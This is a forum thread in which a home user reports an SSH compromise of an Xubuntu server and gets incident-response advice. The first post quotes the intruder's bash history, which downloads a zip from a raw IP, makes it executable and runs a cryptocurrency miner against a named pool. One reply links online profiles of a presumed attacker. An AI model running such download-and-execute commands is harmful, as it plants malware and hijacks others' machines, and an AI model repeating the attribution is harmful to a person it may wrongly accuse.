---
title: "Xubuntu 12.04/64, OpenSSH Server Hacked"
date: 2014-02-04
forum: Security
---

### Post by mbogevik on 2014-02-04
Last night I discovered a task on my Xubuntu 12.04/64 server (yes, conky is nice to have) as a process "m64.pl" used about 85-100% CPU time.  After checking with everyone in my family I see the only option, I have got hacked, possibly through a Windows 7 computer since port 22 is closed in DSL router.

Here is bash history left by hacker :

free -m
cat /proc/cpuinfo
uname -a
ls -l
cd Public
wget 79.114.47.143/m64.zip
unzip m64.zip
chmod +x *
./m64.pl -o stratum+tcp://linuxpower.cf:3333 -u sebywarlord.1 -p miningltcs -B
ps -x
pgrep minerd
w
ifconfig
sude
sudo
sudo useradd ruut
useradd ruut
su root useradd
exit

To me it seems that someone has started a bitcoin task

What I have done is killing the process, remove files in /Public (had to do it in root as they where locked) and uninstall "OpenSSH Server".

Any suggestions on how to handle this would be most appreciated :)

Morten (Smiling after all)

---

### Post by mbogevik on 2014-02-04
It may be that the login is not a SSH login since both of my users says "Last login: Fri Jan 17 12:06:37 2014" while entering command "lastlog".  Also I have Hamachi online on the computer.  Still investigating...

---

### Post by brokenhachi on 2014-02-04
lol... don't open your ssh server with PW auth to the wild world of the internet? You can see the ssh login attempts at /var/log/auth.log 

i'd wipe and reinstall the system if i were you..

---

### Post by lisati on 2014-02-04
*Thread moved to **Security Discussions**.*

---

### Post by ubudog on 2014-02-04
> **brokenhachi said:**
> lol... don't open your ssh server with PW auth to the wild world of the internet? You can see the ssh login attempts at /var/log/auth.log 

i'd wipe and reinstall the system if i were you..

+1 on wiping and reinstalling.

Also, in the future be sure to disable password authentication in /etc/ssh/sshd_config.

[This]("http://bodhizazen.net/Tutorials/SSH_keys") is a great tutorial on how to setup key-based authentication with your ssh server.

---

### Post by CharlesA on 2014-02-04
> **mbogevik said:**
> free -m
cat /proc/cpuinfo
uname -a
ls -l
cd Public
wget 79.114.47.143/m64.zip
unzip m64.zip
chmod +x *
./m64.pl -o stratum+tcp://linuxpower.cf:3333 -u sebywarlord.1 -p miningltcs -B
ps -x
pgrep minerd
w
ifconfig
sude
sudo
sudo useradd ruut
useradd ruut
su root useradd
exit

If this was a hacker, they should have known what system they were accessing via uname -a, so they wouldn't have tried to run su root, because the root user is locked in a default install of Ubuntu.

Do you have any other services running on this box? Just because ssh is not open to the internet does not mean another server isn't open to the internet.

---

### Post by bashiergui on 2014-02-04
> If this was a hacker, they should have known what system they were accessing via uname -a, so they wouldn't have tried to run su root, because the root user is locked in a default install of Ubuntu.Perhaps he's still in training camp?

+1 to the recommendation to reinstall, then make sure you properly secure any internet-facing services. I would also be highly suspicious of all the other computers on this network. I would reimage them all.

There's some fun facts to pull out of your bash history. The IP comes back to Romania.  The name "sebywarlord" includes some interesting online profiles:

1. Seems to be a Romanian fellow just looking for love [http://www.lets101.com/sebywarlord/profile](http://www.lets101.com/sebywarlord/profile)

2. He might be a gamer, there are a bunch of gamer forum profiles.

3. Stack Exchange account with that name posted a pic of himself 
[http://stackoverflow.com/users/3076388/sebywarlord](http://stackoverflow.com/users/3076388/sebywarlord)

4. Sebywarlord is a member of 2 illegal-looking forums where he posted the outcome of what looks like a brute forcing script.

---

### Post by CharlesA on 2014-02-04
> **bashiergui said:**
> Perhaps he's still in training camp?

+1 to the recommendation to reinstall, then make sure you properly secure any internet-facing services. I would also be highly suspicious of all the other computers on this network. I would reimage them all.

+1 to that. I would check /var/log/auth.log for any unusual entries and also check to see which processes are listening on that box before wiping it (take it off the network at least).

```
sudo netstat -nlp
```

---

### Post by mbogevik on 2014-02-05
Yes, large number of login attempts in /var/log/auth.log...

But the thing is I do not have port 22 open on router (DSL), only Teamspeak 3 server and my kids Minecraft server is open to the world.

I think that I first need to find how this person got access, wipe and reinstall may not help if it is through a Windows 7 computer or any other "box" on my LAN, like Xbox 360, Raspberry Pi, VU++ satellite tuner, Popcorn media player or even the Synology DS213j NAS.  But in the end I think the six computers with Windows 7 is the largest gift to a hacker.

I check the netstat command when back from work

---

### Post by bashiergui on 2014-02-05
This guy (the hacker) isn't the sharpest knife in the drawer. Check logs on your minecraft & teamspeak servers for connections to the same IP.

It doesn't really matter how he got in. You could spend a ton of money and time trying to find out. I recommend you focus on inspecting each box the best you can for any evidence of intrusion. Then reimage the ones that are affected. Then figure out how to secure the network.

This of course assumes you have backups... If you don't then unplug the network from the Internet and go buy yourself an external drive to copy all your data to it.

---

### Post by CharlesA on 2014-02-05
> **mbogevik said:**
> Yes, large number of login attempts in /var/log/auth.log...

But the thing is I do not have port 22 open on router (DSL), only Teamspeak 3 server and my kids Minecraft server is open to the world.

I think that I first need to find how this person got access, wipe and reinstall may not help if it is through a Windows 7 computer or any other "box" on my LAN, like Xbox 360, Raspberry Pi, VU++ satellite tuner, Popcorn media player or even the Synology DS213j NAS.  But in the end I think the six computers with Windows 7 is the largest gift to a hacker.

I check the netstat command when back from work

You could also try posting a chunk of the auth.log after removing any personal information. Does the source IP show as coming from your internal network or from outside?

Do you have uPNP enabled on your router?

---

### Post by brokenhachi on 2014-02-05
+1 for the auth.log, interested in seeing that. Sanitize it first though of course. If you want to know how he got in, as someone else mentioned, check logs on the other devices for connections from the same IP. He could have island hopped from another machine, or he could tunnel over http or whatever to get into ssh. You should always place restrictions as close as possible to the restricted machine

The chances that that server is malware infected/still running something are very high though so i would disconnect it. If you want to analyze the data do it offline.. You might also try a portscan on yourself from the office or something to see what exactly is accessible.. try zenmap if you like the gui (its in the repo).

---

### Post by mbogevik on 2014-02-05
Thanks everyone for good tip and suggestions.  My 3com router type 3CRWDR101B-75 has uPNP disabled.  Here is netstat done after i uninstalled OpenSSH server:

```

Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:64586           0.0.0.0:*               LISTEN      1005/utserver   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      796/smbd        
tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN      1488/vino-server
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      1005/utserver   
tcp        0      0 127.0.0.1:10000         0.0.0.0:*               LISTEN      1005/utserver   
tcp        0      0 0.0.0.0:30033           0.0.0.0:*               LISTEN      1498/ts3server_linu
tcp        0      0 127.0.0.1:7634          0.0.0.0:*               LISTEN      1180/hddtemp    
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      1836/dnsmasq    
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      705/cupsd       
tcp        0      0 0.0.0.0:10011           0.0.0.0:*               LISTEN      1498/ts3server_linu
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      796/smbd        
tcp6       0      0 :::5800                 :::*                    LISTEN      1488/vino-server
tcp6       0      0 :::64586                :::*                    LISTEN      1005/utserver   
tcp6       0      0 :::139                  :::*                    LISTEN      796/smbd        
tcp6       0      0 :::5900                 :::*                    LISTEN      1488/vino-server
tcp6       0      0 :::8080                 :::*                    LISTEN      1005/utserver   
tcp6       0      0 ::1:631                 :::*                    LISTEN      705/cupsd       
tcp6       0      0 :::445                  :::*                    LISTEN      796/smbd        
udp        0      0 127.0.0.1:53            0.0.0.0:*                           1836/dnsmasq    
udp        0      0 0.0.0.0:68              0.0.0.0:*                           1467/dhclient   
udp        0      0 0.0.0.0:57454           0.0.0.0:*                           1072/hamachid   
udp        0      0 192.168.1.255:137       0.0.0.0:*                           1981/nmbd       
udp        0      0 192.168.1.45:137        0.0.0.0:*                           1981/nmbd       
udp        0      0 25.255.255.255:137      0.0.0.0:*                           1981/nmbd       
udp        0      0 25.133.235.12:137       0.0.0.0:*                           1981/nmbd       
udp        0      0 0.0.0.0:137             0.0.0.0:*                           1981/nmbd       
udp        0      0 192.168.1.255:138       0.0.0.0:*                           1981/nmbd       
udp        0      0 192.168.1.45:138        0.0.0.0:*                           1981/nmbd       
udp        0      0 25.255.255.255:138      0.0.0.0:*                           1981/nmbd       
udp        0      0 25.133.235.12:138       0.0.0.0:*                           1981/nmbd       
udp        0      0 0.0.0.0:138             0.0.0.0:*                           1981/nmbd       
udp        0      0 0.0.0.0:6771            0.0.0.0:*                           1005/utserver   
udp        0      0 178.73.196.39:43792     0.0.0.0:*                           1072/hamachid   
udp        0      0 0.0.0.0:64586           0.0.0.0:*                           1005/utserver   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           632/avahi-daemon: r
udp        0      0 0.0.0.0:38591           0.0.0.0:*                           632/avahi-daemon: r
udp        0      0 0.0.0.0:9987            0.0.0.0:*                           1498/ts3server_linu
udp6       0      0 :::33467                :::*                                632/avahi-daemon: r
udp6       0      0 :::64586                :::*                                1005/utserver   
udp6       0      0 :::5353                 :::*                                632/avahi-daemon: r
raw        0      0 0.0.0.0:1               0.0.0.0:*               7           1072/hamachid   
raw   231168      0 0.0.0.0:1               0.0.0.0:*               7           1508/lvpnc      
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   PID/Program name    Path
unix  2      [ ACC ]     STREAM     LISTENING     7423     632/avahi-daemon: r /var/run/avahi-daemon/socket
unix  2      [ ACC ]     STREAM     LISTENING     8592     1157/X              /tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     9550     1436/ssh-agent      /tmp/ssh-IxFBlGTw1404/agent.1404
unix  2      [ ACC ]     STREAM     LISTENING     9600     1455/xfce4-session  /tmp/.ICE-unix/1455
unix  2      [ ACC ]     STREAM     LISTENING     10780    1553/pulseaudio    /home/xxxxxx/.pulse/8d4dfdae3ba571c195e6b34b00000002-runtime/native
unix  2      [ ACC ]     STREAM     LISTENING     10102    1508/lvpnc          /tmp/vpnautoconnect.sock
unix  2      [ ACC ]     STREAM     LISTENING     9234     1072/hamachid       /var/run/logmein-hamachi/ipc.sock
unix  2      [ ACC ]     SEQPACKET  LISTENING     6422     320/udevd           /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     10942    1785/gnome-keyring- /tmp/keyring-diMWNo/control
unix  2      [ ACC ]     STREAM     LISTENING     6690     591/dbus-daemon     /var/run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     13349    2212/pptp           /var/run/pptp/255.255.255.255:80.67.8.201
unix  2      [ ACC ]     STREAM     LISTENING     6321     1/init              @/com/ubuntu/upstart
unix  2      [ ACC ]     STREAM     LISTENING     6733     608/bluetoothd      /var/run/sdp
unix  2      [ ACC ]     STREAM     LISTENING     6741     608/bluetoothd      @/org/bluez/audio
unix  2      [ ACC ]     STREAM     LISTENING     17438    2448/dbus-daemon    @/tmp/dbus-5wC8YBkL7E
unix  2      [ ACC ]     STREAM     LISTENING     8286     1110/acpid          /var/run/acpid.socket
unix  2      [ ACC ]     STREAM     LISTENING     8591     1157/X              @/tmp/.X11-unix/X0
unix  2      [ ACC ]     STREAM     LISTENING     291962   705/cupsd           /var/run/cups/cups.sock
unix  2      [ ACC ]     STREAM     LISTENING     11222    1981/nmbd           /var/run/samba/unexpected
unix  2      [ ACC ]     STREAM     LISTENING     9561     1440/dbus-daemon    @/tmp/dbus-utIQPNIVxr
unix  2      [ ACC ]     STREAM     LISTENING     9599     1455/xfce4-session  @/tmp/.ICE-unix/1455

```

---

### Post by CharlesA on 2014-02-05
Are you sure vino wasn't exposed to the internet? There's no way I would run VNC on a *nix box unless I was tunneling it over SSH.

---

### Post by mbogevik on 2014-02-05
Yes, I can see that "my" hacker leaving so much traces is a wannabe that tries to learn from the real ones. And that he like beer, mobile phones, coffee, hanging out with friends, even hugging them, and, desperately want to replace them with a girl...

To me it seems that this guy have deleted auth.log after he finally got logged in since there is only trace of him in auth.log.1  Here I found 7491 lines of his login attempts, obviously he is a bit clever. After removing my own logins and the many Samba logins I decided to only list the first and last part not to spam forum :

```

Jan 30 17:13:11 Motte3 sshd[6855]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.186.62.39  user=root
Jan 30 17:13:13 Motte3 sshd[6855]: Failed password for root from 222.186.62.39 port 4288 ssh2
Jan 30 17:13:24  sshd[6855]: last message repeated 5 times
Jan 30 17:13:24 Motte3 sshd[6855]: Disconnecting: Too many authentication failures for root [preauth]
Jan 30 17:13:24 Motte3 sshd[6855]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.186.62.39  user=root
Jan 30 17:13:24 Motte3 sshd[6855]: PAM service(sshd) ignoring max retries; 6 > 3
Jan 30 17:13:32 Motte3 sshd[6857]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.186.62.39  user=root
Jan 30 17:13:34 Motte3 sshd[6857]: Failed password for root from 222.186.62.39 port 2831 ssh2
Jan 30 17:13:35 Motte3 sshd[6859]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.186.62.39  user=root
Jan 30 17:13:36 Motte3 sshd[6857]: Failed password for root from 222.186.62.39 port 2831 ssh2
Jan 30 17:13:38 Motte3 sshd[6859]: Failed password for root from 222.186.62.39 port 4712 ssh2
Jan 30 17:13:38 Motte3 sshd[6857]: Failed password for root from 222.186.62.39 port 2831 ssh2
Jan 30 17:13:40 Motte3 sshd[6859]: Failed password for root from 222.186.62.39 port 4712 ssh2
Jan 30 17:13:41 Motte3 sshd[6857]: Failed password for root from 222.186.62.39 port 2831 ssh2
Jan 30 17:13:42 Motte3 sshd[6859]: Failed password for root from 222.186.62.39 port 4712 ssh2
Jan 30 17:13:43 Motte3 sshd[6857]: Failed password for root from 222.186.62.39 port 2831 ssh2
Jan 30 17:13:45 Motte3 sshd[6859]: Failed password for root from 222.186.62.39 port 4712 ssh2
Jan 30 17:13:46 Motte3 sshd[6857]: Failed password for root from 222.186.62.39 port 2831 ssh2
Jan 30 17:13:46 Motte3 sshd[6857]: Disconnecting: Too many authentication failures for root [preauth]
Jan 30 17:13:46 Motte3 sshd[6857]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.186.62.39  user=root
Jan 30 17:13:46 Motte3 sshd[6857]: PAM service(sshd) ignoring max retries; 6 > 3
Jan 30 17:13:47 Motte3 sshd[6859]: Failed password for root from 222.186.62.39 port 4712 ssh2
Jan 30 17:13:49 Motte3 sshd[6859]: Failed password for root from 222.186.62.39 port 4712 ssh2
Jan 30 17:13:49 Motte3 sshd[6859]: Disconnecting: Too many authentication failures for root [preauth]
Jan 30 17:13:49 Motte3 sshd[6859]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.186.62.39  user=root
Jan 30 17:13:49 Motte3 sshd[6859]: PAM service(sshd) ignoring max retries; 6 > 3
Jan 30 17:13:53 Motte3 sshd[6861]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.186.62.39  user=root
Jan 30 17:13:55 Motte3 sshd[6861]: Failed password for root from 222.186.62.39 port 4274 ssh2
Jan 30 17:13:57 Motte3 sshd[6873]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.186.62.39  user=root
Jan 30 17:13:58 Motte3 sshd[6861]: Failed password for root from 222.186.62.39 port 4274 ssh2
Jan 30 17:14:00 Motte3 sshd[6873]: Failed password for root from 222.186.62.39 port 4210 ssh2
Jan 30 17:14:00 Motte3 sshd[6861]: Failed password for root from 222.186.62.39 port 4274 ssh2
Jan 30 17:14:01 Motte3 sshd[6875]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.186.62.39  user=root
Jan 30 17:14:01 Motte3 sshd[6873]: Failed password for root from 222.186.62.39 port 4210 ssh2
Jan 30 17:14:02 Motte3 sshd[6861]: Failed password for root from 222.186.62.39 port 4274 ssh2
Jan 30 17:14:03 Motte3 sshd[6875]: Failed password for root from 222.186.62.39 port 3848 ssh2
Jan 30 17:14:04 Motte3 sshd[6873]: Failed password for root from 222.186.62.39 port 4210 ssh2
Jan 30 17:14:04 Motte3 sshd[6861]: Failed password for root from 222.186.62.39 port 4274 ssh2
Jan 30 17:14:05 Motte3 sshd[6875]: Failed password for root from 222.186.62.39 port 3848 ssh2
Jan 30 17:14:06 Motte3 sshd[6873]: Failed password for root from 222.186.62.39 port 4210 ssh2
Jan 30 17:14:06 Motte3 sshd[6861]: Failed password for root from 222.186.62.39 port 4274 ssh2
Jan 30 17:14:06 Motte3 sshd[6861]: Disconnecting: Too many authentication failures for root [preauth]
.....
Feb  1 16:40:02 Motte3 sshd[16942]: input_userauth_request: invalid user test [preauth]
Feb  1 16:40:02 Motte3 sshd[16942]: pam_unix(sshd:auth): check pass; user unknown
Feb  1 16:40:02 Motte3 sshd[16942]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.85.90.245 
Feb  1 16:40:04 Motte3 sshd[16942]: Failed password for invalid user test from 222.85.90.245 port 40044 ssh2
Feb  1 16:40:05 Motte3 sshd[16942]: Received disconnect from 222.85.90.245: 11: Bye Bye [preauth]
Feb  1 16:40:08 Motte3 sshd[16944]: reverse mapping checking getaddrinfo for 245.90.85.222.broad.zz.ha.dynamic.163data.com.cn [222.85.90.245] failed - POSSIBLE BREAK-IN ATTEMPT!
Feb  1 16:40:08 Motte3 sshd[16944]: Invalid user test from 222.85.90.245
Feb  1 16:40:08 Motte3 sshd[16944]: input_userauth_request: invalid user test [preauth]
Feb  1 16:40:08 Motte3 sshd[16944]: pam_unix(sshd:auth): check pass; user unknown
Feb  1 16:40:08 Motte3 sshd[16944]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.85.90.245 
Feb  1 16:40:10 Motte3 sshd[16944]: Failed password for invalid user test from 222.85.90.245 port 41105 ssh2
Feb  1 16:40:11 Motte3 sshd[16944]: Received disconnect from 222.85.90.245: 11: Bye Bye [preauth]
Feb  1 16:40:14 Motte3 sshd[16946]: reverse mapping checking getaddrinfo for 245.90.85.222.broad.zz.ha.dynamic.163data.com.cn [222.85.90.245] failed - POSSIBLE BREAK-IN ATTEMPT!
Feb  1 16:40:14 Motte3 sshd[16946]: Invalid user test from 222.85.90.245
Feb  1 16:40:14 Motte3 sshd[16946]: input_userauth_request: invalid user test [preauth]
Feb  1 16:40:14 Motte3 sshd[16946]: pam_unix(sshd:auth): check pass; user unknown
Feb  1 16:40:14 Motte3 sshd[16946]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.85.90.245 
Feb  1 16:40:16 Motte3 sshd[16946]: Failed password for invalid user test from 222.85.90.245 port 42166 ssh2
Feb  1 16:40:17 Motte3 sshd[16946]: Received disconnect from 222.85.90.245: 11: Bye Bye [preauth]
Feb  1 16:40:20 Motte3 sshd[16948]: reverse mapping checking getaddrinfo for 245.90.85.222.broad.zz.ha.dynamic.163data.com.cn [222.85.90.245] failed - POSSIBLE BREAK-IN ATTEMPT!
Feb  1 16:40:20 Motte3 sshd[16948]: Invalid user test from 222.85.90.245
Feb  1 16:40:20 Motte3 sshd[16948]: input_userauth_request: invalid user test [preauth]
Feb  1 16:40:20 Motte3 sshd[16948]: pam_unix(sshd:auth): check pass; user unknown
Feb  1 16:40:20 Motte3 sshd[16948]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.85.90.245 
Feb  1 16:40:22 Motte3 sshd[16948]: Failed password for invalid user test from 222.85.90.245 port 43183 ssh2
Feb  1 16:40:23 Motte3 sshd[16948]: Received disconnect from 222.85.90.245: 11: Bye Bye [preauth]
Feb  1 16:40:27 Motte3 sshd[16950]: reverse mapping checking getaddrinfo for 245.90.85.222.broad.zz.ha.dynamic.163data.com.cn [222.85.90.245] failed - POSSIBLE BREAK-IN ATTEMPT!
Feb  1 16:40:27 Motte3 sshd[16950]: Invalid user test from 222.85.90.245
Feb  1 16:40:27 Motte3 sshd[16950]: input_userauth_request: invalid user test [preauth]
Feb  1 16:40:27 Motte3 sshd[16950]: pam_unix(sshd:auth): check pass; user unknown
Feb  1 16:40:27 Motte3 sshd[16950]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.85.90.245 
Feb  1 16:40:29 Motte3 sshd[16950]: Failed password for invalid user test from 222.85.90.245 port 44273 ssh2
Feb  1 16:40:30 Motte3 sshd[16950]: Received disconnect from 222.85.90.245: 11: Bye Bye [preauth]
Feb  1 16:40:34 Motte3 sshd[16952]: reverse mapping checking getaddrinfo for 245.90.85.222.broad.zz.ha.dynamic.163data.com.cn [222.85.90.245] failed - POSSIBLE BREAK-IN ATTEMPT!
Feb  1 16:40:34 Motte3 sshd[16952]: Invalid user test from 222.85.90.245
Feb  1 16:40:34 Motte3 sshd[16952]: input_userauth_request: invalid user test [preauth]
Feb  1 16:40:34 Motte3 sshd[16952]: pam_unix(sshd:auth): check pass; user unknown
Feb  1 16:40:34 Motte3 sshd[16952]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=222.85.90.245 
Feb  1 16:40:36 Motte3 sshd[16952]: Failed password for invalid user test from 222.85.90.245 port 45401 ssh2
Feb  1 16:40:36 Motte3 sshd[16952]: Received disconnect from 222.85.90.245: 11: Bye Bye [preauth]

```

As first line in auth.log starts "Feb 2 08:17:01 " this can be assumed is close the when he succeed, of a few hours later. (This is the point where my wife booted her new Ubuntu laptop and gigolo mounts the server)

Enjoy !

---

### Post by CharlesA on 2014-02-05
That tells me SSH was open to the internet because the IP in the log is a public one, not a private one (192.168.x.y/10.x.y.z).

---

### Post by brokenhachi on 2014-02-05
I don't see the success authentication in that log, maybe that is the one he deleted? 

what are you using PPTP for? Are you logging pptp connections (/var/log/wtmp)?

Also +1 for no vino :( 


Edit: +1 CharlesA, definitely looks like ssh-server was open to the internet...

---

### Post by mbogevik on 2014-02-05
This is how my DSL routers firewall was set up when I got hacked.  The other tabs is not set up/unused.  I noticed though that my routers firewall was set to "Protection Level" = "Medium", not "High".
Local IP for my server is 192.168.1.45 and only two ports are enabled.

---

### Post by bashiergui on 2014-02-05
> But the thing is I do not have port 22 open on router (DSL), only Teamspeak 3 server and my kids Minecraft server is open to the world.
But you have port 22 open on your private network? Then I guess he opened it up to the internet. That would require a router reconfig. Do you have default credentials on the router? 

Here are my recommendations for someone technically savvy but not a professional security guy: 

1. Reset the router, wii, xbox, ps to factory settings. That will boot him off if he managed to own one of them.
2. Download 2 or 3 antivirus free scanners (AVG, McAfee, malwarebytes, whatever. Jus pick a recognizable name). Install & update them on all windows boxes.
3. Unplug the whole network from the internet.
4.  Scan all the windows desktops/laptops  and servers with AV. If any infections are found then reimage it. You can copy data off onto an external drive relatively safely before you reimage if necessary.
5. Inspect the windows servers for odd or missing event logs. Any signs of hacking just reimage.
6. We already decided your ubuntu server is owned, so reimage that.

Then as you rebuild the systems I encourage you to research how to secure the network and machines. Secure all your running services with keys if you can, strong long passwords if not.  Don't allow anonymous ftp login. Make all the boxes automatically update. Install EMET on the Windows boxes. [http://www.microsoft.com/en-us/download/details.aspx?id=39273](http://www.microsoft.com/en-us/download/details.aspx?id=39273)
Use a firewall on each host. Disable upnp.

---

### Post by brokenhachi on 2014-02-06
+1 for this. I'm a huge fan of malwarebytes and clamav. Also, the Kaspersky rescue disk is great for offline scanning (i.e livecd). If you dont know it, this is a great little gui for iptables based firewalls (among others): [http://www.fwbuilder.org/](http://www.fwbuilder.org/)

If you need remote admin access to the network, maybe consider openvpn, or getting an actual firewall applicance (which i highly recommend, as its a great learning experience if you're interested in networking/security). You can then configure ipsec vpns and use shrew to connect when needed. You can pick up good deals from some sites..

Good luck!

---

### Post by bashiergui on 2014-02-06
Adding a small clarification: AV in general is awesome at finding malware we know about, but it completely sucks at finding customized or modified malware. Since we've pretty well established that your little Romanian hacker is not the kind of guy that rolls his own 0-days, the odds are high that AV will find some of what he dropped.

---

### Post by CharlesA on 2014-02-06
> **brokenhachi said:**
> +1 for this. I'm a huge fan of malwarebytes and clamav. Also, the Kaspersky rescue disk is great for offline scanning (i.e livecd). If you dont know it, this is a great little gui for iptables based firewalls (among others): [http://www.fwbuilder.org/](http://www.fwbuilder.org/)

Personally, I would rather someone learn about iptables and what the various rules does than use a wizard to build rules.

This is a good start, if you want to learn about iptables:
[http://bodhizazen.net/Tutorials/iptables](http://bodhizazen.net/Tutorials/iptables)

I use CSF on my VPSes, but plain IP tables on my home server, so take that for what it's worth. ;)

---

### Post by 1clue on 2014-02-06
You need to take a look at everything on your network.  Game machines, smart TVs, and pretty much anything that has a network presence is theoretically hackable.

If you open a port on your firewall, it should be restricted to exactly one place in your network, and if possible change the port to a non-default port above 5000.

Frankly I would put a second firewall in, leave all your game machines and TV sets, and your game server on the DMZ and put everything else behind the second firewall.  Don't allow anything at all to initiate a connection to the inside network, everything should come from inside.

Then start reading here:  [https://wiki.ubuntu.com/BasicSecurity](https://wiki.ubuntu.com/BasicSecurity)

---

### Post by mbogevik on 2014-02-06
It is most likely my router that has a security problem that has been used to get through to the OpenSSH-server.  After all it is made by one of the large companies that have given NSA a back-door, and surely one that over time gets shared with common hackers too.

 It seems like I have been lucky after all as it seems that an unexperienced from Romania succeed and tried to gain BitCoins.  In log there are lots of attempts from all over China and some from Mexico and Washington (US) so it may have many hackers that have tried.  And yes, I do not have any log on his successful login as he deleted auth.

My BIG mistake was to install OpenSSH-server without IP range limits, or simply local IP access only.  SSH is uninstalled and will not be installed again unless I really need it, and only after I have gone through the security of program and my network.  So yes, my SSD was open to my local LAN and was exposed to any "leak" in my router...

At the moment I search through the server files that should not be there, in system SSD and on the network shares on the 3T HDD, but that takes some time to get through.  Reinstall needs some hours work that I do not have at the moment...

Thank everyone for advices !

---

### Post by CharlesA on 2014-02-06
I doubt this person got thru to your server from another local machine because the IP address is not a private one, and unless all the machines on your network are using public IPs, that isn't possible.

More likely the server was placed in the DMZ or port forwarding placed the port SSH uses outside the firewall on the router. With that being said, I use keys for public access to my server but I sometimes use passwords for local access, especially if I am running a VM or something and I need to pull files from my server.

In my case, I have set up iptables to whitelist a few specific IP addresses to let thru the firewall and connect. Everything else gets dropped.

---

### Post by mbogevik on 2014-02-07
I agree, with many logged SSH attempts with public IP it is 100% sure he got through directly from Internet.

 But still, there is no possibility to connect my Linux server directly to internet, the ADSL router has four RJ45 network sockets, all inside firewall, only telephone line and power is other connections.  One Ethernet plug goes from Router into a 1G switch that then feeds server and everything else online, through several switches around the house. So it is not possible to expose the server to Internet without a firewall (not other than switching it off in Router with web interface, that is closed for external IPs)

My Routers firewall have always been enabled, and only port 9987 and 25565 have been opened to the server.  When he still had got in with a public IP on port 22 he must have used a weakness in the Router.  Hacking my Hamachi VPN is hardly possible, and if so, IP would have started on 25.x.x.x (or 5)

So this is really not a "Linux problem" at all but more that I started to use SSH (even that I did not really needed it) without making sure my SSH filtering configuration was safe.

When I reinstall my server I would consider to install a firewall on it.

---

